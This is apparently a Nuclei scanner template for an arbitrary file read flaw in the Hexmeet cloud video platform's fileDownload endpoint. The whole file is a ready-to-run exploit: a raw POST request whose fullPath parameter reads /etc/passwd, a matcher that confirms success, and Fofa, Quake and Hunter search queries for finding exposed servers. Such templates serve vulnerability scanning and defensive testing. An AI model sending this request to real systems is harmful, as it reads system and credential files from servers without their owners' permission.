id: Hexmeet_cloud_video_fileDownload_Fileread

info:
  name: Hexmeet_cloud_video_fileDownload_Fileread
  author: HK
  severity: medium
  description: 会捷通云视讯平台/fileDownload?action=downloadBackupFile接口fullPath参数存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/him/api/rest/v1.0/node/role"
    Quake-query: body="/him/api/rest/v1.0/node/role"
    Hunter-query: body="/him/api/rest/v1.0/node/role"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /fileDownload?action=downloadBackupFile HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.57
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Connection: close
    Content-Length: 20

    fullPath=/etc/passwd

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - root